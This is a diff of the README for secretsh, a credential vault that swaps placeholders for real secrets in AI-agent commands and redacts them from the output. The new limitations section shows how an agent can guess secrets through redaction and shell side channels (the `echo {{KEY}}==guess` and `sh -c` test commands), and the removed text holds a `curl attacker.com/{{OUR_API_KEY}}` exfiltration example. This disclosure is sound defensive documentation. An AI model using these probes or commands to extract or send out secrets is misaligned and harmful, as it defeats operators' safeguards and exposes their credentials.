@@ -7,6 +7,8 @@
 [![PyPI](https://img.shields.io/pypi/v/secretsh.svg)](https://pypi.org/project/secretsh/)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 
+**Status: beta.** Core functionality is stable and tested, but the security model has known limitations — read the [Security Model](#security-model) section before using in production.
+
 secretsh keeps credentials out of LLM context, shell history, and command output. AI agents write commands with `{{PLACEHOLDER}}` tokens; secretsh resolves them against an encrypted vault and redacts any secrets that leak back through stdout/stderr.
 
 ```
@@ -14,6 +16,8 @@ Agent prompt:  curl -u admin:{{API_PASS}} https://internal/api
 Child argv:    curl -u admin:hunter2 https://internal/api
 Agent sees:    curl -u admin:[REDACTED_API_PASS] https://internal/api
 ```
+
+> **AI-agent deployments:** use `--no-shell` to block shell interpreters and close the conditional-probe oracle. See [Security Model](#security-model) for known limitations.
 
 ---
 
@@ -25,7 +29,7 @@ When an AI agent runs `curl -u admin:hunter2 ...`, three things go wrong:
 2. **Shell history records it** in `~/.bash_history`.
 3. **Command output may echo it** back (`curl -v`, misconfigured services), and the LLM ingests it.
 
-secretsh fixes all three: secrets live in an encrypted vault, enter the process only at `exec` time, and are scrubbed from output before anything reaches the caller.
+secretsh fixes (1) and (2) unconditionally. For (3) it provides best-effort redaction — see [Security Model](#security-model) for what that means in practice.
 
 ---
 
@@ -106,7 +110,13 @@ secretsh set API_USER
 secretsh run -- "curl -u {{API_USER}}:{{API_PASS}} https://httpbin.org/basic-auth/admin/hunter2"
 ```
 
-The output is always scrubbed -- any vault secret (raw, base64, URL-encoded, or hex) is replaced with `[REDACTED_<KEY>]`.
+Output is scrubbed — any vault secret (raw, base64, URL-encoded, or hex) is replaced with `[REDACTED_<KEY>]`.
+
+**For AI-agent contexts, add `--no-shell`** to prevent the agent from using shell interpreters to probe secret values:
+
+```bash
+secretsh run --no-shell -- curl -u "{{API_USER}}:{{API_PASS}}" https://api.example.com
+```
 
 ### 4. See what's stored
 
@@ -139,24 +149,34 @@ All commands read the passphrase from the `SECRETSH_KEY` environment variable by
 
 ### What secretsh protects against
 
-- Secret leakage into LLM prompt/context (placeholder model)
-- Secret leakage via shell history
-- Secret leakage via stdout/stderr (Aho-Corasick streaming redaction)
-- Encoded secret leakage (base64, URL-encoding, hex)
+- Secret leakage into LLM prompt/context (placeholder model — agent never sees values)
+- Secret leakage via shell history (value never on command line)
+- Secret leakage via spawn error messages (argv[0] passed through redactor before appearing in errors)
+- Secret leakage via stdout/stderr — **best effort**: Aho-Corasick substring redaction covering raw, base64, URL-encoded, and hex forms
+- Shell conditional oracle when `--no-shell` is set (shell interpreters rejected before any child runs)
 - Vault tampering (HMAC-authenticated header + per-entry AES-256-GCM with positional AAD + full-file commit tag)
 - Metadata leakage from vault file (key names are encrypted)
-- Core dump inclusion (RLIMIT_CORE=0)
+- Core dump inclusion (`RLIMIT_CORE=0`)
+
+### Known limitations
+
+**Redaction is substring matching.** If your secret value is a common string (`123456`, `true`, `yes`, `development`), every occurrence of that string in child output will be redacted — including unrelated log lines, port numbers, or status text. There is no fix for this within a substring-matching model.
+
+**The redaction side-channel oracle is not fully closed.** An AI agent can run `echo {{KEY}}==guess` and observe whether `==guess` is also redacted in the output. If it is, the guess matched the secret. This leaks one bit per probe and cannot be eliminated without breaking legitimate mixed-token uses like `curl -H "Authorization: {{TOKEN}}"`.
+
+**`--no-shell` closes the shell conditional oracle** but only when set by the operator. Without it, an agent can run `sh -c '[ "{{KEY}}" = guess ] && echo yes'` to probe the secret with no redaction at all.
+
+**`--vault` must appear before `--`.** Anything after `--` is captured as the command; `secretsh run -- cmd --vault path` silently uses the default vault.
 
 ### What is explicitly out of scope
 
 - `/proc/<pid>/cmdline` inspection (secret is in child argv for its lifetime)
 - Physical memory attacks (cold boot, kernel exploits)
-- Malicious commands that exfiltrate their own arguments
+- A child process reading its own argv and exfiltrating it
 - Compromise of the master passphrase itself
+- Secrets encoded in forms beyond raw, base64, URL-encoded, and hex
 
-**To be clear** -- this isn't a silver bullet. It doesn't stop a truly malicious command from exfiltrating data (e.g. `curl attacker.com/{{OUR_API_KEY}}`). But it does solve the massive problem of accidental exposure in logs, history, and LLM context windows.
-
-See [docs/threat-model.md](docs/threat-model.md) for the full threat model and technical architecture.
+See [docs/threat-model.md](docs/threat-model.md) for the complete threat model.
 
 ### Cryptographic Primitives
 
@@ -239,15 +259,17 @@ secretsh run --vault ~/.secretsh/work.vault --master-key-env WORK_KEY -- \
 
 Each vault is independent: different passphrase, different salt, different entries.
 
-### Resource Limits
+### `run` Flags
 
-| Limit | Default | Flag |
-|-------|---------|------|
-| Child timeout | 300s | `--timeout` |
-| Max stdout | 50 MiB | `--max-output` |
-| Max stderr | 1 MiB | `--max-stderr` |
+| Flag | Default | Purpose |
+|------|---------|---------|
+| `--no-shell` | off | Reject shell interpreters (`sh`, `bash`, `zsh`, `dash`, `fish`, `ksh`, `tcsh`, …) as argv[0]. **Recommended for AI-agent deployments.** |
+| `--timeout` | 300s | Kill child after N seconds |
+| `--max-output` | 50 MiB | Kill child if stdout exceeds this |
+| `--max-stderr` | 1 MiB | Kill child if stderr exceeds this |
+| `--quiet` | off | Suppress audit JSON on stderr |
 
-Exceeding any limit triggers SIGTERM + SIGKILL escalation (exit code 124).
+Timeout and output-limit kills use SIGTERM + SIGKILL escalation (exit code 124). Shell delegation blocked by `--no-shell` exits with code 125.
 
 ---
 
@@ -298,7 +320,7 @@ Requires Python 3.10+.
 # Build
 cargo build
 
-# Run Rust tests (188 unit tests)
+# Run all tests (233: 220 unit + 13 integration)
 cargo test
 
 # Lint
